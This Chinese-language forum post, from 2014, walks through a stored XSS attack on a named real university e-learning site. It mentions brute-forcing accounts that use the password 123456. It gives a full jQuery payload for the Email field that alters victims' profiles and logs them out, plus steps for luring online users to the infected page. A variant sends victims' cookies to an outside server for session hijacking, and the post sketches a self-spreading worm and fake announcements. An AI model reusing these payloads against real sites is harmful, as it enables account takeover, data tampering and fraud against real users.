# eol.wyu.cn上的XSS漏洞

*原发表于: https://github.com/WuyiUniversity/forum/issues/13*

*2014-06-01*

## 爆破密码123456之徒

[前面一节](https://github.com/WuyiUniversity/forum/issues/12)提到如何列举密码为123456的学号。它一不设验证码，二不封恶意IP，因此可以轻松爆破入口。

其实有那个列表，加上暴力，就可以干“很多事情”了。但是，今天我们讲讲eol上的XSS漏洞。

## 能干哪些“坏事”？

- ~~修改密码~~（需要原密码）
- 修改资料
- 退出登录/泄露cookie

> 就这么多？

对，确实不多，另外如“选课”、“写笔记”、“发话题”等比较杂，我们不去讨论。

> eol没人上啊，搞XSS有意义吗？

对，是很少人上，不过我们玩的就是**角色扮演、以小见大**，同时感到轻松。

## 注入代码，“分享”链接

1. 登录一个账号，进入“修改信息”，点击“修改”

1. 在“Email”中填入以下内容：

  ```html
  <script src="//code.jquery.com/jquery.min.js"></script>
  <script>
    function logout() {
      $.get('/resource/logout.jsp')
      $.get('/eol/popups/logout.jsp')
    }
    function getSid(cb) {
      $.get('/eol/main.jsp', function(html){
        var sid = html.match(/\?userid=(\d+)/)[1]
        cb(sid)
      })
    }
    function modify(data, cb) {
      getSid(function(sid){
        $.post('/eol/popups/student_info_modify_do.jsp', {
          SID: sid,
          from: 'welcomepage',
          rd: 'null',
          IPT_EMAIL: data.email,
          IPT_PHONE: data.phone,
          IPT_MOBILE: data.mobile,
          IPT_SUMMARY: data.summary
        }, cb)
      })
    }
    //////////////
    modify({
      sid: sid,
      email: '???',
      phone: '???',
      mobile: '???',
      summary: '???'
    }, logout)
  </script>
  ```

1. 打开控制台，输入：

  ```js
  document.main.document.form1.submit()
  ```

1. 提示修改成功，代码注入完毕，控制台输入：

  ```js
  document.main.location.href
  ```

1. 可以去掉`&`后面的部分，得到类似下面的url，将它“分享”给别人：

  ```
  http://eol.wyu.cn/eol/popups/viewstudent_info.jsp?SID=36066
  ```

1. 将它“分享”给其他在线的eol用户

## 简单的解析

### 范围的局限

这个url就是被注入的页面了，它是代码执行的入口，所以要诱使别人打开。

这里条件有些苛刻，必须是**在线的同站用户**，因为在这里我们注入的代码仅对他们有效。

我们的代码会使他们修改信息，然后退出登录。

### cookie泄露

当然，你可以把`logout`换成`postCookie`：

```js
function postCookie() {
  //$.get('//my.server.com/eol/zombie?cookie=' + document.cookie)
  $('<img>').attr('src', '//my.server.com/eol/zombie?cookie=' + document.cookie)
}
```

实现cookie泄露，而不是退出登录，服务端得到cookie后，可以利用其身份直接进入系统。

### 病毒式传播

`modify`的参数，也就是修改后的资料，当然不必非得是`???`，可以自己定。

假如我们把`email`设成起初填入“Email”中那冗长的段代码本身（需要重构），想象一下，假如那个入口页本身就是用户能频繁访问到的，不怎么需要我们去“分享”的，那么会怎样？

结果会是，一传十、十传百，甚至最终全站的人都“无法登录”了。当然，只是表面上，但也是一次十足的“病毒式传播”了。

## 其他玩法

正如前面提到的，还有“选课”、“写笔记”、“发话题”等各种操作，都可以实现。

噢，对了，还可以注入样式和内容，比方说把那个入口页改造成一个全新的自己的网页，伪造成新闻、公告等等任何你能想到的具有欺诈性成分。

我并不算特别了解XSS，表达也主观。**这是XSS吗？欢迎大家吐槽，一起交流。**

---

## 号被删

刚刚发现我的eol账号居然被删除了！我想是这两天异常操作太频繁吧，最终**自食其果**。

> 1. 您所查询的用户不存在!
2. 用户已被删除!

他们居然干得出来！**“学习交流！学习交流！”**

---

最后的补充：后来我到办公室反映自己号上不了，对这件事只字未提，
工作人员表示惊讶后，给我设定了一个新号，用户名相同但ID是新的，问题就解决了，也逃过一劫。
